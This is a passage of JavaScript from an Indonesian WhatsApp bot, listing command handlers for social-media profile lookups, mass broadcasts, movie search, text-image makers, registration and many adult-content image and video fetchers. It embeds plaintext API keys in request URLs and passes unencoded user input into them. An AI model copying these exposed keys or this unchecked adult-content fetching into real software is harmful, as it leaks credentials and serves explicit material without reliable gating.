              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
     /* case "igstalk":
        if (!q) return reply("Usernamenya?");
        const tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        const tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        ronove.sendMessage(from, buff, image, { quoted: mek, caption: tt });
        break;*/
      
      case "tiktokstalk":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://dhn-api.herokuapp.com/api/stalk/tiktok?user=${q}&apikey=699549d096658975133aa`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        ronove.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
      case "igstory":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!q) return reply("Usernamenya?");
        hx.igstory(q).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              ronove.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              ronove.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;

  case 'nulis': case 'nulisbuku':            
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
            if (args.length == 0) return reply(`contoh: ${prefix + command} Vall`)
            sticWait(from)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://itsmevall.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)            
            ronove.sendMessage(from, ini_buf, image, {  caption: `*nih kak*`, quoted: mek})
         
            break
case 'bc':

					ronove.updatePresence(from, Presence.composing)

					if (!isOwner && !mek.key.fromMe) return sticOwner(from)

					if (args.length < 1) return reply('Teksnya?')

					anu = await ronove.chats.all()

					if (isMedia && !mek.message.videoMessage || isQuotedImage) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek

						buff = await ronove.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							ronove.sendMessage(_.jid, 

			{"contentText": `
${body.slice(4)}
${readmore}
「All chat broadcast」`,

			"footerText": `*「 ${namabot} 」*`,

			"buttons": [

			{"buttonId": `menu`,

			"buttonText": {"displayText": "DidinSec〆⁩"

			},"type": "RESPONSE"}

			], "headerType": 1,

			}, MessageType.buttonsMessage )

							ronove.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek

						buff = await ronove.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							ronove.sendMessage(_.jid, 

			{"contentText": `${body.slice(4)}
${readmore}
「All chat broadcast」`,

			"footerText": `*「 ${namabot} 」*`,

			"buttons": [

			{"buttonId": `menu`,

			"buttonText": {"displayText": "KIRANA"

			},"type": "RESPONSE"}

			], "headerType": 1,

			}, MessageType.buttonsMessage )

							ronove.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek

						buff = await ronove.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							ronove.sendMessage(_.jid, 

			{"contentText": `${body.slice(4)}
${readmore}
「All chat broadcast」`,

			"footerText": `*「 ${namabot} 」*`,

			"buttons": [

			{"buttonId": `menu`,

			"buttonText": {"displayText": "KIRANA"

			},"type": "RESPONSE"}

			], "headerType": 1,

			}, MessageType.buttonsMessage )

							ronove.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

					} else {

             for (let _ of anu) {

ronove.sendMessage(_.jid, 

			{"contentText": `${body.slice(4)}
${readmore}
「All chat broadcast」`,

			"footerText": `*「 ${namabot} 」*`,

			"buttons": [

			{"buttonId": `menu`,

			"buttonText": {"displayText": "KIRANA"

			},"type": "RESPONSE"}

			], "headerType": 1,

			}, MessageType.buttonsMessage )

}

						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)

					}

					break
//movie
case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.Language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await ronove.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
//lolhuman nsfw
case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                sticWait(from)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)
              buttons = [{buttonId: `${command}`,buttonText:{displayText: `➡️NEXT➡️`},type:1}]
              imageMsg = (await ronove.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:`${namabot}`, imageMessage: imageMsg,
              contentText:`Jangan Lupa Donasi ketik ${prefix}donasi`,buttons,headerType:4}
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{quoted: fdoc})
              ronove.relayWAMessage(prep)
       
                    break
//Hardianto nsfw
case 'yuri':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=${hardi}`)
anu = await getBuffer(kon)
ronove.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'anal':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=${hardi}`)
kon = await getBuffer(aku)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'lesbian':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=${hardi}`)
kon = await getBuffer(kau)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'eroneko':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'bj':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'kitsune':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'pussy':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=${hardi}`)
ronove.sendMessage(from, hai, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'ttp':
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
sticWait(from)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break
case 'animestick':
       case 'stickeranime':
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              sendWebp(from, pjrr)
}
)
              break
case 'patrick':
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
break
       case 'gura':
       case 'gawgura':
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
case 'doge':
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
//////////END
case 'wallpaper':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'neko2':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'baka':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'slap':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'poke':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'keta':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=${hardi}`)
kon = await getBuffer(hai)
ronove.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case  'awoo':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
ronove.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case  'blowjob':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
ronove.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case  'hentai': 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
ronove.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case  'megumin':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
ronove.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case  'neko':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
ronove.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'verify':
              
if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
	         try {
								ppimg = await ronove.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const anuu = `「 ᴘᴇɴᴅᴀғᴛᴀʀᴀɴ ᴜsᴇʀ 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*🌹 Nama :* ${pushname}
*🌹 API :* +${sender.split('@')[0]}
*🌹 Serial:* ${serialUser}
*🌹 Total:* ${_registered.length} Pengguna

*「 ᴅɪᴅɪɴʙᴏᴛ 」*
`
         haitod = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
             buttons = [{buttonId: `menu`,buttonText:{displayText: `ᴍᴇɴᴜ〆⁩`},type:1}]
              imageMsg = (await ronove.prepareMessageMedia(haitod, "imageMessage", { thumbnail: haitod, })).imageMessage
              buttonsMessage = {footerText:`Created by ${namaowner} シ︎`, imageMessage: imageMsg,
              contentText:`${anuu}`,buttons,headerType:4}
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{quoted: fdoc})
              ronove.relayWAMessage(prep)
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
            setTimeout( () => {
			ronove.updatePresence(from, Presence.composing)
			reply(`*Terimakasih Telah Terdaftar Di ${namabot}*`)
		}, 2000)
        break
case  'trapnime':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
sticWait(from)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
ronove.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
//Done
case 'nuliskiri':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=${hardi}`)
anu = await getBuffer(kon)
ronove.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'nuliskanan':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=${hardi}`)
anu = await getBuffer(kon)
ronove.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'foliokanan':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=${hardi}`)
anu = await getBuffer(kon)
ronove.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'xs':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!c) return reply('Nyari Apa?')
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
sticWait(from)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
ronove.sendMessage(from, anu, text, {quoted: mek})
break
case 'tesges':
teks = `tes`
       ronove.sendMessage(from, teks, text, {sendEphemeral:true, quoted:mek})
break
case 'namaninja':
if (!q) return reply(`NAMANYA SIAPA TOD?`)
fets = await fetchJson(`https://api.lolhuman.xyz/api/ninja?apikey=PinnBotWibu&nama=${q}`)
reply(fets.result)
break
case 'lolkey':
       case 'cekapikey':
              if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 
              anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${q}`)
              teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://api.lolhuman.xyz`
              ronove.sendMessage(from, teks, text, {quoted: freply})
              break
case 'xvideo':
case 'xv':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!c) return reply('Linknya?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
sticWait(from)
vid = await getBuffer(x.result.files.low)
ronove.sendMessage(from, vid, video, {quoted: mek})
break
case 'foliokiri':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=${hardi}`)
anu = await getBuffer(kon)
ronove.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
break
case 'nsfw':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return sticAdmin(from)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply(`Sudah Aktif Kak`)
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply(`Sukses mengaktifkan fitur nsfw`)
						ronove.sendMessage(from, `Bebas Nyari Hentai :v`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply(`Sudah Mati Kak`)
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses menonaktifkan fitur nsfw')
					} else {
						reply(`1 untuk mengaktifkan, 0 untuk mematikan`)
					}
					break
//Xchillds
          case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = body.slice(8)
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'googletxt2':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu|Kamiyaka`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
